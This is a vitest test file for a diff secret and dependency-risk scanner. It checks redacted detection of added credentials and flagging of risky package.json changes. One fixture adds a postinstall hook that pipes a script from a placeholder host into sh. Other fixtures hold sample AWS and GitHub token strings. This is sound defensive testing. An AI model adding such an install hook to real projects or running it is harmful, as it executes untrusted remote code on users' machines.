/**
 * Diff secret scanner — proves it flags credentials the diff ADDS (redacted), ignores
 * removed/context lines and pre-existing secrets, and never fabricates a leak or a pass.
 */
import { describe, it, expect } from 'vitest';
import { scanDiffForSecrets } from './security-scan.service.js';

const diff = (...lines: string[]) => lines.join('\n');

describe('scanDiffForSecrets', () => {
  it('flags a private key + an AWS access key on ADDED lines, attributed to their file, REDACTED', () => {
    const r = scanDiffForSecrets({
      diffText: diff(
        '+++ b/src/config.ts',
        '+const key = "-----BEGIN RSA PRIVATE KEY-----";',
        '+const awsId = "AKIAIOSFODNN7EXAMPLE";',
      ),
    });
    expect(r.findings.map((f) => f.rule).sort()).toEqual(['aws-access-key', 'private-key']);
    expect(r.findings.every((f) => f.file === 'src/config.ts')).toBe(true);
    // Redacted — never echoes the full secret.
    expect(r.findings.some((f) => f.evidence.includes('AKIAIOSFODNN7EXAMPLE'))).toBe(false);
    expect(r.summary).toMatch(/remove before merging/i);
  });

  it('flags a secret-named var assigned a long literal (generic-secret)', () => {
    const r = scanDiffForSecrets({ diffText: diff('+++ b/a.ts', '+const api_key = "abcdef1234567890xyz";') });
    expect(r.findings[0].rule).toBe('generic-secret');
  });

  it('ignores secrets on REMOVED / context lines and the +++ header itself', () => {
    const r = scanDiffForSecrets({
      diffText: diff(
        '+++ b/a.ts',
        '-const old = "AKIAIOSFODNN7EXAMPLE";', // removed — not this change
        ' const ctx = "ghp_012345678901234567890123456789012345";', // context
      ),
    });
    expect(r.findings).toEqual([]);
    expect(r.summary).toMatch(/no secrets/i);
  });

  it('does NOT flag a short/ordinary quoted string (precision over recall)', () => {
    const r = scanDiffForSecrets({ diffText: diff('+++ b/a.ts', '+const name = "hello world";', '+const n = 42;') });
    expect(r.findings).toEqual([]);
  });

  it('dedupes the same secret repeated + returns [] for an absent diff', () => {
    const r = scanDiffForSecrets({
      diffText: diff('+++ b/a.ts', '+x = "AKIAIOSFODNN7EXAMPLE"', '+y = "AKIAIOSFODNN7EXAMPLE"'),
    });
    expect(r.findings).toHaveLength(1);
    expect(scanDiffForSecrets({ diffText: null }).findings).toEqual([]);
  });

  it('hard-blocks new package install hooks without echoing their command', () => {
    const r = scanDiffForSecrets({
      diffText: diff(
        '+++ b/package.json',
        '   "scripts": {',
        '+    "postinstall": "curl https://example.invalid/install.sh | sh"',
        '   }',
      ),
    });
    expect(r.dependencyRisks).toEqual([{
      rule: 'install-script',
      file: 'package.json',
      level: 'blocker',
      evidence: 'postinstall lifecycle script added',
    }]);
    expect(r.summary).not.toContain('curl');
  });

  it('identifies new registry and non-registry dependencies as review evidence', () => {
    const r = scanDiffForSecrets({
      diffText: diff(
        '+++ b/package.json',
        '   "dependencies": {',
        '+    "zod": "^4.0.0",',
        '+    "internal-tool": "git+ssh://git@example.invalid/tool.git"',
        '   }',
      ),
    });
    expect(r.dependencyRisks).toEqual([
      { rule: 'new-dependency', file: 'package.json', level: 'review', evidence: 'zod@^4.0.0 added' },
      { rule: 'non-registry-dependency', file: 'package.json', level: 'review', evidence: 'internal-tool added from a non-registry source' },
    ]);
    expect(r.summary).not.toContain('git+ssh');
  });

  it('flags oversized lockfile churn as review evidence', () => {
    const lines = Array.from({ length: 501 }, (_, index) => `+lock row ${index}`);
    const r = scanDiffForSecrets({ diffText: diff('+++ b/pnpm-lock.yaml', ...lines) });
    expect(r.dependencyRisks).toEqual([{
      rule: 'large-lockfile-change',
      file: 'pnpm-lock.yaml',
      level: 'review',
      evidence: '501 lockfile lines added',
    }]);
  });
});
